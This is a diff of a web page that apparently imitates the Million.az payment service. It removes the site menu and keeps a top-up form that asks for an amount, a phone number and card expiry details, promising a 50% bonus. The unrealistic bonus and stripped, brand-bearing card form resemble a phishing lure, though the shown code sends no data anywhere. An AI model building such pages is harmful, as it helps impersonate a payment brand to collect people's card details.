@@ -31,8 +31,7 @@
       background-color: #fff;
       padding: 50px;
       display: flex;
-      align-items: center;
-      justify-content: space-between;
+      justify-content: center; /* Sadece logo merkezi yapılacak */
       box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
       position: fixed;
       top: 0;
@@ -45,49 +44,24 @@
     }
 
     .header .menu {
-      display: flex;
-      gap: 20px;
-      font-size: 14px;
-    }
-
-    .header .menu a {
-      text-decoration: none;
-      color: #333;
-      transition: color 0.3s;
-    }
-
-    .header .menu a:hover {
-      color: #d30412;
-    }
-
-    @media (max-width: 768px) {
-      .header {
-        justify-content: center;
-      }
-
-      .header .menu {
-        display: none;
-      }
-
-      .content {
-        margin-top: 150px;
-      }
+      display: none; /* Menü kaldırıldı */
     }
 
     /* Modal */
     .modal {
       background: rgba(110, 110, 110, 0.155);
-      width: 100%;
-      max-width: 600px;
+      width: 90%; /* Modal pencereyi sola ve sağa biraz büyütüyoruz */
+      max-width: 800px; /* Maksimum genişlik sınırı ekledik */
       padding: 30px;
       border-radius: 40px;
       box-shadow: 0 4px 6px rgba(103, 84, 84, 0.367);
       backdrop-filter: blur(40px);
-      z-index: 2;
+      z-index: 999;
       position: relative;
       margin: 0 auto;
       max-height: 80%;
       overflow-y: auto;
+      margin-top: 150px; /* Modal'ın header ile çakışmaması için boşluk ekledik */
     }
 
     .form-group {
@@ -119,7 +93,7 @@
     /* Yeni Hesaplama ve Bonus Yazısı */
     .result-text {
       font-size: 16px; /* Küçültüldü */
-      color: white;
+      color: rgb(51, 203, 51);
       font-weight: bold;
       font-family: 'Roboto', Arial, sans-serif;
       margin-top: 15px;
@@ -144,15 +118,23 @@
       width: 100%;
       font-weight: bold;
     }
-    .result-text {
-  color: #32CD32; /* Yeşil renk kodu */
-  font-size: 16px;
-  font-weight: bold;
-}
 
     button:hover {
       background-color: #a9030b;
     }
+
+
+
+    select {
+  width: 100%;
+  padding: 12px;
+  font-size: 20px;
+  box-sizing: border-box;
+  border: 1px solid #ccc;
+  border-radius: 40px;
+  background-color: #f9f9f9; /* Daha açık bir gri arka plan */
+  color: #333; /* Gri metin rengi */
+}
 
     /* İçerik */
     .content {
@@ -167,8 +149,6 @@
       width: 100%;
       padding-bottom: 50px;
     }
-
-
 
     h2 {
       font-size: 36px;
@@ -251,13 +231,7 @@
   <!-- Header -->
   <div class="header">
     <div class="logo">
-      <img src="Logo.svg" alt="Million.az Logo">
-    </div>
-    <div class="menu">
-      <a href="#">Bütün xidmətlər</a>
-      <a href="#">Terminal xəritəsi</a>
-      <a href="#">Bizimlə əlaqə</a>
-      <a href="#">Bizə qoşul</a>
+      <img src="Logo.svg" alt="Million.az Logo"> <!-- Logo sadece merkezde olacak -->
     </div>
   </div>
 
@@ -279,8 +253,6 @@
 
         <div class="form-group">
           <label for="tutar" class="green-label">Yükləyəcəyiniz Məbləğ (₼)</label>
-
-
           <input type="number" id="tutar" name="tutar" placeholder="0" oninput="hesapla(this.value)" required>
         </div>
    
@@ -312,16 +284,21 @@
               <option value="11">11</option>
               <option value="12">12</option>
             </select>
-
+        
             <select id="son-kullanma-yil" name="son-kullanma-yil" required>
               <option value="">İl</option>
               <option value="2024">2024</option>
               <option value="2025">2025</option>
+              <option value="2026">2026</option>
+              <option value="2027">2027</option>
+              <option value="2028">2028</option>
             </select>
           </div>
         </div>
 
-        <button type="submit">Balans Artır</button>
+        <div class="form-group">
+          <button type="submit">Yüklə</button>
+        </div>
       </form>
     </div>
   </div>
@@ -329,24 +306,40 @@
   <!-- Footer -->
   <div class="footer">
     <div class="payment-icons">
-      <img src="kart.png" alt="Visa Mastercard" />
+      <img src="kart.png" alt="Payment Method"> <!-- Sadece 1 kart.png ekledik -->
     </div>
+
     <div class="footer-bottom">
-      <span>© 2024 Million.az. Bütün hüquqlar qorunur. <a href="#">Əlaqə</a></span>
+      <p>© 2024 <a href="#">Million.az</a>. All rights reserved.</p>
     </div>
   </div>
 
   <script>
-    function hesapla(value) {
-      const bonus = (parseFloat(value) * 0.50).toFixed(2);
-      document.getElementById('result').innerText = 'Hesabınıza gələcək məbləğ (50% bonus ilə): ' + (parseFloat(value) + parseFloat(bonus)).toFixed(2) + '₼';
+    // Hesaplama ve Bonus Gösterimi
+    function hesapla(tutar) {
+      const bonus = 0.5; // %50 bonus
+      const sonuc = (parseFloat(tutar) * (1 + bonus)).toFixed(2);
+      document.getElementById("result").textContent = `Hesabınıza gələcək məbləğ (50% bonus ilə): ${sonuc}₼`;
     }
 
+    // Telefon Numarası Maskesi
     function telefonInput(input) {
-      const value = input.value;
-      if (value.length > 4 && value.charAt(4) !== ' ') {
-        input.value = value.slice(0, 4) + ' ' + value.slice(4);
+      const value = input.value.replace(/\D/g, "");
+      if (value.length <= 4) {
+        input.value = "+" + value;
+      } else if (value.length <= 7) {
+        input.value = "+" + value.slice(0, 4) + " " + value.slice(4);
+      } else if (value.length <= 10) {
+        input.value = "+" + value.slice(0, 4) + " " + value.slice(4, 7) + " " + value.slice(7);
+      } else {
+        input.value = "+" + value.slice(0, 4) + " " + value.slice(4, 7) + " " + value.slice(7, 10) + " " + value.slice(10);
       }
+    }
+
+    function gonder(event) {
+      event.preventDefault(); // Sayfanın yenilenmesini engeller
+      // Form verisini burada işleyebilirsiniz
+      alert("Məlumatlar göndərildi!");
     }
   </script>
 </body>
